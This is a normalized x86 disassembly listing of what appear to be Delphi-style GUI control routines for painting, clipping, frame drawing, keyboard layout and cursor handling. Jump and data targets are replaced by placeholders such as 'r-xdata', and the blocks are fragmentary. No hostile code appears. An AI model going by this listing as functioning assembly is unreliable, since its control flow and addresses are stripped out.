test [ ebx + 0x50 ] 0x10
je r-xdata
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x14 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412938
lea eax [ esp + 0x10 ]
push eax
push ebp
call RectVisible
test eax eax
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax [ esi + 0x19c ]
mov edx edi
call sub_413d6c
mov ebx eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
inc edi
cmp edi [ esp ]
jl r-xdata
test [ esi + 0x54 ] 0x80
je r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
mov eax 0xff000010
call sub_41c768
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
mov edx [ ebx + 0x44 ]
dec edx
mov eax [ ebx + 0x40 ]
dec eax
call sub_412938
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
mov eax 0xff000014
call sub_41c768
push eax
call CreateSolidBrush
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x44 ]
add eax [ ebx + 0x4c ]
inc eax
push eax
lea eax [ esp + 0x18 ]
push eax
mov ecx [ ebx + 0x40 ]
add ecx [ ebx + 0x48 ]
inc ecx
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412938
lea eax [ esp + 0x14 ]
push eax
push ebp
call FrameRect
mov eax [ esp + 0x8 ]
push eax
call DeleteObject
test [ ebx + 0x1c ] 0x10
je r-xdata
push ebp
call SaveDC
mov [ esp + 0x4 ] eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebp
call sub_438c88
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push ebp
call IntersectClipRect
push 0x0
mov ecx ebp
mov edx 0xf
mov eax ebx
call sub_43b4f4
mov eax [ esp + 0x4 ]
push eax
push ebp
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
or [ ebx + 0x54 ] 0x80
test [ ebx + 0x51 ] 0x4
jne r-xdata
sub_43eb64
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x80
push esi
call SaveDC
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
call sub_438c88
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor edi edi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0xffffffec
mov eax ebx
call sub_440b28
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
push 0xfffffff0
mov eax ebx
call sub_440b28
push eax
call GetWindowLongA
test eax 0x800000
je r-xdata
mov [ ebp - 0x8 ] 0xa
mov edi 0x200f
jmp r-xdata
test edi edi
je r-xdata
mov [ ebp - 0x8 ] 0x3
mov edi 0xa00f
push 0x0
mov ecx esi
mov edx 0x14
mov eax ebx
call sub_43b4f4
push 0x0
mov ecx esi
mov edx 0xf
mov eax ebx
call sub_43b4f4
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call SetRect
push edi
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push esi
call DrawEdge
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_438c88
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
mov eax [ ebp - 0xc ]
push eax
push esi
call RestoreDC
and [ ebx + 0x54 ] 0xff7f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x10 ]
jne r-xdata
mov edx [ eax + 0x44 ]
push edx
mov ecx [ eax + 0x40 ]
mov edx esi
call sub_43eb64
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x19c ]
call sub_413d6c
cmp [ eax + 0x57 ] 0x0
je r-xdata
sub_43ecb8
push ebp
mov ebp esp
add esp 0xffffff94
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
test [ ebx + 0x55 ] 0x1
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43e7dc
jmp r-xdata
mov eax ebx
call sub_43d858
test eax eax
jne r-xdata
push 0x0
call GetDC
mov edi eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push edi
call CreateCompatibleBitmap
mov [ ebp - 0x8 ] eax
push edi
push 0x0
call ReleaseDC
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push j_sub_403858#6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_440b28
push eax
call BeginPaint
mov edi eax
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0x14
mov eax ebx
call sub_43b4f4
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov edx esi
mov eax ebx
call sub_43ecb8
xor eax eax
mov [ esi + 0x4 ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x5c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x50 ]
push eax
lea edx [ ebp - 0x6c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x64 ]
push eax
push 0x0
push 0x0
push edi
call BitBlt
lea eax [ ebp - 0x4c ]
push eax
mov eax ebx
call sub_440b28
push eax
call EndPaint
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_43ee18
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43e7a8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ee38
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_43e7a8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43eeac
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43e7a8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43eecc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43e7a8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43eeec
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43e7a8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ef10
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43e7a8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ef34
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43e7a8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ef58
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43e7a8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ef7c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_42f358
mov edi eax
mov eax edi
call sub_42f438
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_41d428
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_440b28
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_42f5d0
jmp r-xdata
sub_43f004
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_43be28
test bl bl
je r-xdata
mov eax edi
call sub_440e38
mov eax edi
call sub_440a30
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_440a30
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_43f0c4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_43ba84
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_43f114
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_440e38
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_43d3e8
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403300
sub_43f15c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_439e90
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_43e414
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_459d04
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4581ec
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_43f2ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_43f38b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f392
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_440b28
mov dl [ ebx + 0x184 ]
call sub_445718
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458164
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407c08
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_457f64
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_457f64
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_457f64
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_43f398
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43f422
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f429
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458164
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_407c08
test eax eax
je r-xdata
mov eax ebx
call sub_440b28
mov dl 0x1
call sub_4456fc
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_43f484
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_412928
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_43b4f4
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_43f4d4
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_43f508
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403300
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403300
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_43f548
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_43b4f4
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_43f5a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_419d5c
mov edx [ r-xdata ]
call sub_4032b4
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_43f5d8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_413d6c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43f5fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_440b28
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_43f658
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_43f5c4
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_413d6c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_43f698
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_40550c
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_40550c
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_43f704
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_43f7ac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f7b3
lea eax [ ebp - 0x4 ]
call sub_4054f4
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_437ff8
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403104
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_4054f4
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403300
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_40550c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030d4
mov [ edi + 0x178 ] eax
sub_43f7bc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_440b28
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_43d3c0
xor edx edx
push ebp
push sub_43f87e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403300
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f885
mov eax [ ebp - 0x4 ]
call sub_43d3c8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_43f885
mov eax [ ebp - 0x4 ]
call sub_4514e0
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_43a5ac
sub_43f8d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_40304c
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43c1b4
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_43f93a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_43a5ac
sub_43f954
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_43f97c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4514e0
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4513e8
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403300
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43f97c
test al al
jne r-xdata
sub_43f9e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f97c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_441be0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43fa10
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f97c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_441be0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43fa3c
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_43fa64
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4514e0
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4513e8
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403300
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43fa64
test al al
jne r-xdata
sub_43facc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fa64
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43faec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fa64
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43fb2c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4514e0
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403300
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_43fb2c
test al al
jne r-xdata
sub_43fb90
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fb2c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
